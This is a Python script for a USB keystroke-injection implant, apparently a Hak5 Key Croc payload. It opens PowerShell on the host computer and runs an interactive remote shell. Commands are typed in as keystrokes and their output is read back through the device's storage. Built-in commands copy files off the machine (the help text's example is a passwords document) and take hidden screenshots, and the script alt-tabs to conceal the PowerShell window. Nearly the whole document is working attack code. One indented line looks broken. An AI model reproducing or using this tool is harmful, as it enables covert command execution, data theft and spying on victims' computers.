#!/usr/bin/env python
import os, time, codecs

def init_ps():
    os.system("rm /root/udisk/out.txt.* > /dev/null 2>&1")
    os.system("ATTACKMODE HID STORAGE > /dev/null 2>&1")
    time.sleep(3)

    os.system("QUACK GUI r")
    time.sleep(2)

    os.system("QUACK STRING powershell.exe")
    os.system("QUACK ENTER")
    time.sleep(2)

    os.system('QUACK STRING "\$cr0cp4th1387b=Join-Path -Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel KeyCroc).DriveLetter).Root -ChildPath \"out.txt\""')
    os.system("QUACK ENTER")
    time.sleep(1)


# SETTING UP THE SHELL
print "Starting the shell ..."
init_ps()

# SHELL
ctr = 0
cmd = ""
while True:
    cmd = raw_input("CrocSHELL> ").strip()
    
    if cmd == "exit":
        break

    elif cmd[0:5] == "exfil":
        cmd = cmd.replace("exfil", "cp") + " (Split-Path $cr0cp4th1387b -Parent)"

    elif cmd == "peek":
        cmd  = "Start-Sleep -Seconds 2; "
        cmd += "Add-Type -AssemblyName System.Windows.Forms; "
        cmd += "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
        cmd += "$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); "
        cmd += "$graphic = [System.Drawing.Graphics]::FromImage($image); "
        cmd += "$point = New-Object System.Drawing.Point(0, 0); "
        cmd += "$graphic.CopyFromScreen($point, $point, $image.Size); "
        cmd += "$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size); "
        cmd += "[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds); "
        cmd += "$p = Join-Path -Path (Split-Path $cr0cp4th1387b -Parent) -ChildPath screenshot_"+str(ctr+1)+".jpg; "
        cmd += "$image.Save(\"$p\", [System.Drawing.Imaging.ImageFormat]::Png); "

	    cmd = cmd.replace("$", "\\$").replace('"', '\\\"')
        os.system('QUACK STRING "'+cmd+'"')
        os.system("QUACK ENTER")
        os.system("QUACK GUI DOWN")
        time.sleep(5)
        os.system("QUACK ALT TAB")

        cmd = "echo \"$p ... saved\" "

    elif cmd == "help":
        print "\n AVAILABLE COMMANDS:\n-------------------"
        print "exit .... End shell \nexfil ... Exfiltrate file - e.g.: exfil my_secret_passwords.docx \npeek .... Take a screenshot"
        print ""
        continue

    ctr += 1
    cmd = cmd.replace("$", "\\$").replace('"', '\\\"')+' | Out-File \\\"\$cr0cp4th1387b.'+str(ctr)+'\\\"; echo \\\"%%%DONE%%%\\\" >> \\\"\$cr0cp4th1387b.'+str(ctr)+'\\\"'

    os.system('QUACK STRING "'+cmd+'"')
    os.system("QUACK ENTER")

    outp = ""
    while not "%%%DONE%%%" in outp:
        time.sleep(1)
        f = open("/root/udisk/out.txt."+str(ctr), "r")
        outp = f.read()
        outp = outp.decode("UTF-16")
        outp = outp.encode("UTF-8")
        f.close()
    
    end = outp.index("%%%DONE%%%")
    outp = outp[0:end].replace("\r", "").strip()

    print outp


# CLEANING UP
os.system('QUACK STRING "'+cmd+'"')
os.system("QUACK ENTER")
os.system("ATTACKMODE HID > /dev/null 2>&1")

